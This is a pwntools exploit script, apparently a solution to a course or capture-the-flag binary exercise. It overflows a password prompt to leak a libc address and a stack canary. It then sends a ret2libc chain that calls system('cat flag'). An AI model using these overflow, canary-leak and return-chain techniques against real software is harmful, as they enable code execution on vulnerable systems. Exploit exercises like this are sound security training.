#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = 'handout/exercise4/exercise4b'
#exe = './exercise4b'
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================



r = start()

libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
e = ELF(exe)

r.recvuntil(b'your name?\n')
r.sendline(b"cat flag")
r.recvuntil(b'password:\n')
r.sendline(b'A'*167)

recv = r.readuntil(b" is not the password")
fgets_addr = int.from_bytes(recv[15+168:15+174], "little") - 154 # <fgets+154>
offset = fgets_addr - libc.sym["fgets"]
cat_flag = 0x4040a0

r.recvuntil(b'password:\n')
r.sendline(b'A'*215)
recv = r.readuntil(b" is not the password")
canary = recv[15+216:15+220]
sys_addr = libc.sym["system"] + offset 
exit_addr = libc.sym["exit"] + offset 
check_author_ret = e.symbols["check_authorization"] + 138

r.sendline(b's'*216 + canary + b"s"*12 + p64(check_author_ret) + p64(sys_addr) + p64(exit_addr) + p64(cat_flag))
print(r.recvall())
